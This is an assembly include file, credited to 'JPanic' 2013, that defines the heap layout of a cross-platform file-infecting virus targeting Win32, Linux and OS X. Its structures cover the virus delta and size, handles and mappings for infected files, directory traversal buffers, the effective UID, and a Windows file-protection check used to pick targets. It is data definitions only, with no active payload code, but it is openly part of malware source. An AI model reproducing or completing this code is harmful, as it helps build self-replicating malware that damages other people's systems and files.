;= Virus Heap Structure Definition (c) 2013 JPanic ========================
;
; Defines structure of virus heap and addressing shortcuts.
;
; General Layout:
; 	VirusDelta, FileHandle, FileSize, FileMappedImage,
;	OS_Proc_Table,
;	UNION {
;		Win32Heap
;		LinuxHeap
;               OSXHeap
;	}
;
;- Directive Warez --------------------------------------------------------
include inc\win32.inc
include inc\linux.inc
include inc\osx.inc
include inc\elf.inc
include inc\short.inc
include win32imps.ash
include osprocs.ash

		.486
		
;- Short Cuts -------------------------------------------------------------
vheap		EQU	(ebp-7Fh)
Win32Heap	EQU	(vheap._Win32Heap)
LinuxHeap	EQU	(vheap._LinuxHeap)
OSXHeap         EQU     (vheap._OSXHeap)

;- Win32 Heap -------------------------------------------------------------
TWin32Heap			STRUC	
	dwSfcIsFileProtected	dd	?
	dwMapHandle		dd	?
	W32_IMP_LIST		<<dw!&_impname!& dd ?>>	
	WFF_Entry		WFF	<>
TWin32Heap			ENDS

Win32ProcAddr			=	(dwMapHandle + size dwMapHandle)
LastWin32ProcAddr               =       (Win32ProcAddr + (K32ProcCount * 4) - 4)

;- Linux Heap -------------------------------------------------------------
TLinuxHeap			STRUC	
	statbuf			stat	<>
        dirp			dirent	<>	
TLinuxHeap                      ENDS

; - OSX Heap --------------------------------------------------------------
TOSXHeap                        STRUC
        osx$maxdirbufptr	dd	?
	osx$curdirbufptr	dd	?
        osx$statbuf             osx$stat        <>        
	osx$dirbasep		dq	?
TOSXHeap                        ENDS

;- Complete Virus Heap ----------------------------------------------------
_VirusHeap			STRUC
	dwVirusDelta		dd	?
	dwVirusSize		dd	?
	dwFileHandle		dd	?
	dwMappedSize		dd	?
	dwMappedFile		dd	?
	dwFileSize		dd	?
	dwSavedFMode		dd	?
        dwFindHandle            dd      ?
	dwRandSeed		dd	?	; STOSD from here.	
	dwDirCWD		dd	?	; 0
	dwDirA			dd	?	; 0 
	dwDirB			dd	?	; 0 
        dwBigBuf		dd	?	; 0
	dwEUID                  dd      ?	; 0	
	dwDOT			dd	?	; 0x2E
	OS_PROC_LIST		<<dwV!&_procname!& dd ?>>
	UNION
		_Win32Heap		TWin32Heap	<>
		_LinuxHeap		TLinuxHeap	<>
                _OSXHeap                TOSXHeap        <>
	ENDS	
_VirusHeap			ENDS

VProcList		=	(dwDOT + size dwDOT)

;- OS Specific Big Buffers ------------------------------------------------
; Win32
win32$bigbuf			STRUC
	win32$FullPathName	dw 	MAX_PATH dup(?)
	win32$CurrentDir	dw 	MAX_PATH dup(?)
	win32$WindowsDir	dw 	MAX_PATH dup(?)
	win32$SystemDir		dw 	MAX_PATH dup(?)
win32$bigbuf			ENDS
win32$bigbuf_size		=	size win32$bigbuf

;OSX
osx$bigbuf			STRUC
	osx$dirp		db (32 * 1024) dup (?)
				align 1000h
osx$bigbuf			ENDS
osx$bigbuf_size			=	size osx$bigbuf

;==========================================================================